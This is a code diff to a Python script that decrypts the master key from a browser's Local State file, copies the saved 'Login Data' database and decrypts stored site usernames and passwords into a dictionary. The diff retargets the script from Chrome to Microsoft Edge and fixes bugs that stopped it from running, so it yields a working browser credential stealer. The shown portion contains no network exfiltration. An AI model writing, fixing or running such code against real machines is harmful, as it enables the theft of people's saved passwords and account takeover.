@@ -15,16 +15,16 @@ def chrome_datetime(time_in_mseconds):
     
 def encryption_key():
     localState_path = os.path.join(os.environ['USERPROFILE'],
-                       "AppData","Local","Google","Chrome",
+                       "AppData","Local","Microsoft","Edge",
                         "User Data","Local State")
     with open(localState_path, 'r', encoding="utf-8") as f:
-        local_state_file=file.read()
+        local_state_file=f.read()
         local_state_file=json.loads(local_state_file)
-    ASE_key = base64.b64decode(local_state_file["os-crypt"]["encrypted_key"])[5:]
+    ASE_key = base64.b64decode(local_state_file["os_crypt"]["encrypted_key"])[5:]
     return win32crypt.CryptUnprotectData(ASE_key, None, None, None, 0)[1]  # decryted key
 
 def decrypt_password(enc_password, key):
-     try:
+    try:
         init_vector = enc_password[3:15]
         enc_password = enc_password[15:]
         cipher = AES.new(key, AES.MODE_GCM, init_vector)
@@ -37,7 +37,7 @@ def decrypt_password(enc_password, key):
 
 def getCreds():
     password_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
-                            "Google", "Chrome", "User Data", "Default", "Login Data")
+                            "Microsoft", "Edge", "User Data", "Default", "Login Data")
     shutil.copyfile(password_db_path,"my_chrome_data.db")
     db = sqlite3.connect("my_chrome_data.db")
     cursor = db.cursor()
@@ -54,7 +54,7 @@ def getCreds():
             data[site_url].append({
                 "username": username,
                 "password": password,
-                "date_created": str(my_chrome_datetime(date_created))
+                "date_created": str(chrome_datetime(date_created))
                 })
         else:
             continue 
